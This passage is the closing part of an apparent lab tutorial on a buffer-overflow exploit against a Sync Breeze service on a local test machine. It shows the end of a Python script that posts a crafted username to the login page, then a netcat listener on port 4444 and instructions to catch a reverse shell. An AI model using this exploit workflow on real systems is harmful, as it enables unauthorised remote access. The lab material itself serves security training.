</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;12345&#34;</span>}
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;crashed&#34;</span>)
</span></span></code></pre></div><p>Now the code is ready</p>
<p><a href="#overview">Back to top</a></p>
<br>
<h1 id="gaining-shell">Gaining Shell</h1>
<p>From your kali machine prepare a netcat listener to listen at port <code>4444</code> and execute the script. You should get a shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo nc -nvlp <span style="color:#ae81ff">4444</span>
</span></span></code></pre></div><p>Execute the script. You should be able to get the a shell.
<img src="/images/reverseShell2.png" alt="Reverse Shell"/></p>
<p><a href="#overview">Back to top</a></p>

  <hr>
<div class="footer">
    
    
    
    <p>
    This is a post in the <b><a href="/series/hacking">Hacking</a></b> series.
        <br>Other posts in this series:
        <ul class="series">
            
            
            
            <li>
                February 3, 2023 -
                
                    Buffer Overflow
                
            </li>
            
            <li>
                February 3, 2023 -
                
                    Buffer Overflow
                
            </li>
            
        </ul>
    </p>
    
</div>

  <div class="article-toc " >
    <h4></h4>
    <nav id="TableOfContents">
  <ul>
    <li><a href="#system-requirements">System Requirements</a></li>
    <li><a href="#installing-vulnerable-application">Installing Vulnerable Application</a></li>
  </ul>

  <ul>
    <li><a href="#check-if-application-is-vulnerable">Check if Application is Vulnerable</a></li>
    <li><a href="#verify-vulnerability">Verify Vulnerability</a>
      <ul>
        <li><a href="#attach-sync-breeze-service-to-immunuty-debugger">Attach Sync Breeze service to Immunuty Debugger</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#locating-eip">Locating EIP</a></li>
    <li><a href="#controlling-eip">Controlling EIP</a></li>
  </ul>
</nav>
</div>

</div>
        </main>
    </body>
</html>
